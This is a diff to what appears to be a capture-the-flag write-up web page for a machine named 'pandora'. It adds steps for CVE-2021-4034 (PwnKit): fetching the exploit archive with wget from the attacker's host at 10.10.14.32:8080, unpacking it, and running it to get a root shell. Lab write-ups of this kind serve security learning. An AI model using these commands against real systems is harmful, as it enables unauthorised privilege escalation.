@@ -452,8 +452,49 @@ linpeas.sh                        100%[=========================================
 
 2022-02-22 10:23:39 (68.6 KB/s) - ‘linpeas.sh’ saved [765822/765822]
     </pre></div>
-    <p>Then we run the script(don't forget to allow it(chmod)). While I was looking in to the result... oh hell yeah here come the badboy CVE-2021-3034</p>
-<figure class="wp-block-image size-large"><img data-attachment-id="724" data-permalink="https://suppi147.github.io/suppisWriteup/suppi/" data-orig-file="https://suppi147.github.io/suppisWriteup/suppi/cve.png" data-orig-size="999,562" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ssh" data-image-description="" data-image-caption="" data-medium-file="https://suppi147.github.io/suppisWriteup/suppi/cve.png?w=300" data-large-file="https://suppi147.github.io/suppisWriteup/suppi/cve.png?w=750" src="https://suppi147.github.io/suppisWriteup/suppi/cve.png?w=999" alt="" class="wp-image-724" srcset="https://suppi147.github.io/suppisWriteup/suppi/cve.png 999w, https://suppi147.github.io/suppisWriteup/suppi/cve.png?w=150 150w, https://suppi147.github.io/suppisWriteup/suppi/cve.png?w=300 300w, https://suppi147.github.io/suppisWriteup/suppicves.png?w=768 768w" sizes="(max-width: 999px) 100vw, 999px" /><figcaption><strong>CVE-2021-3034</strong></figcaption></figure>
+    <p>Then we run the script(don't forget to allow it(chmod)). While I was looking in to the result... oh hell yeah here come the badboy CVE-2021-4034.</p>
+<figure class="wp-block-image size-large"><img data-attachment-id="724" data-permalink="https://suppi147.github.io/suppisWriteup/suppi/" data-orig-file="https://suppi147.github.io/suppisWriteup/suppi/cve.png" data-orig-size="999,562" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ssh" data-image-description="" data-image-caption="" data-medium-file="https://suppi147.github.io/suppisWriteup/suppi/cve.png?w=300" data-large-file="https://suppi147.github.io/suppisWriteup/suppi/cve.png?w=750" src="https://suppi147.github.io/suppisWriteup/suppi/cve.png?w=999" alt="" class="wp-image-724" srcset="https://suppi147.github.io/suppisWriteup/suppi/cve.png 999w, https://suppi147.github.io/suppisWriteup/suppi/cve.png?w=150 150w, https://suppi147.github.io/suppisWriteup/suppi/cve.png?w=300 300w, https://suppi147.github.io/suppisWriteup/suppicves.png?w=768 768w" sizes="(max-width: 999px) 100vw, 999px" /><figcaption><strong>CVE-2021-4034</strong></figcaption></figure>
+<p>About this <a href="https://www.thesecmaster.com/how-to-fix-the-polkit-privilege-escalation-vulnerability-cve-2021-4034/">CVE-2021-4034</a>. To gain root, we need to build this file in to runable shell(make) then zip it for tranfering it through 8080 client-server and when we got zip file on the target server we will unzip it.</p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; title: ; notranslate" title="">┌──(daniel@pandora:/tmp)-&#91;~]
+wget http://10.10.14.32:8080/kkk.tar.gz
+--2022-02-22 10:26:33--  http://10.10.14.32:8080/kkk.tar.gz
+Connecting to 10.10.14.32:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 59096 (58K) [application/gzip]
+Saving to: ‘kkk.tar.gz’
+
+kkk.tar.gz                        100%[============================================================>]  57.71K  38.9KB/s    in 1.5s    
+
+2022-02-22 10:26:34 (38.9 KB/s) - ‘kkk.tar.gz’ saved [59096/59096]
+
+    </pre></div>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; title: ; notranslate" title="">┌──(daniel@pandora:/tmp)-&#91;~]
+tar -xvf kkk.tar.gz 
+CVE-2021-4034/.git/logs/refs/remotes/origin/HEAD
+CVE-2021-4034/.git/refs/remotes/origin/HEADdaniel@pandora:/tmp$ tar -xvf kkk.tar.gz 
+CVE-2021-4034/.git/logs/refs/remotes/origin/HEAD
+CVE-2021-4034/.git/refs/remotes/origin/HEAD
+...
+    </pre></div>
+<p>Now let get root.</p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; title: ; notranslate" title="">┌──(daniel@pandora:/tmp)-&#91;~]
+ls
+CVE-2021-4034  systemd-private-75f90995316a4b18aa227cf33904883a-apache2.service-hM60xg
+]              systemd-private-75f90995316a4b18aa227cf33904883a-systemd-logind.service-ZleLji
+exploit.py     systemd-private-75f90995316a4b18aa227cf33904883a-systemd-resolved.service-aTBbrf
+exploit2.py    systemd-private-75f90995316a4b18aa227cf33904883a-systemd-timesyncd.service-y1vv4g
+kkk.tar.gz     tar
+linpeas.sh     tmux-1001
+revshell.php   vmware-root_723-4282236435
+daniel@pandora:/tmp$ cd CVE-2021-4034/
+daniel@pandora:/tmp/CVE-2021-4034$ ls
+'GCONV_PATH=.'   Makefile    cve-2021-4034     cve-2021-4034.sh   gconv-modules   pwnkit.so
+ LICENSE         README.md   cve-2021-4034.c   dry-run            pwnkit.c
+daniel@pandora:/tmp/CVE-2021-4034$ ./cve-2021-4034
+# whoami
+root
+    </pre></div>
+    <img style="float: right; display: none" class="loading" src="https://suppi147.github.io/suppisWriteup/suppi/FOI.gif">
 
     <!-- +++++ Projects Section +++++ -->
         
